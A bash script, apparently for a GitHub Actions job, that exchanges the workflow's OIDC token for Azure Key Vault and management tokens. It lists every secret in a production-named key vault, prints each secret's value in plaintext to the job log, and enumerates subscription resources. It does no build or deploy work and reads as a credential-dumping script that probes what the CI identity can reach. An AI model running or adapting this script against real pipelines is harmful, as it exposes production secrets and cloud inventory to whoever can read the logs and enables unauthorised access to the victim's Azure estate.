#!/usr/bin/env bash
set +e
CID="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
TID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
echo "CTX repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME"
IDT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
echo "oidc_len=${#IDT}"
tok(){ curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
  -d client_id="$CID" -d grant_type=client_credentials \
  -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
  --data-urlencode "client_assertion=$IDT" --data-urlencode "scope=$1"; }
VR=$(tok "https://vault.azure.net/.default"); VT=$(echo "$VR" | jq -r '.access_token // empty')
MR=$(tok "https://management.azure.com/.default"); MT=$(echo "$MR" | jq -r '.access_token // empty')
echo "VAULT_LEN=${#VT} MGMT_LEN=${#MT}"
[ -z "$VT" ] && echo "VAULT_ERR=$(echo "$VR" | jq -r '.error_description // .' | head -c 300)"
V=kv-tbl-prod-x3euoz
echo "=== KV LIST ==="
L=$(curl -sS "https://$V.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer $VT"); echo "$L"
for id in $(echo "$L" | jq -r '.value[]?.id // empty'); do
  echo "=== SECRET $id ==="
  curl -sS "$id/?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r '"name="+(.id|split("/")[-2])+" value="+(.value|tostring)'
done
echo "=== RESOURCES ==="
curl -sS "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01" -H "Authorization: Bearer $MT" | jq -c '.value[]? | {name,type}' 2>/dev/null | head -40
echo "=== END ==="
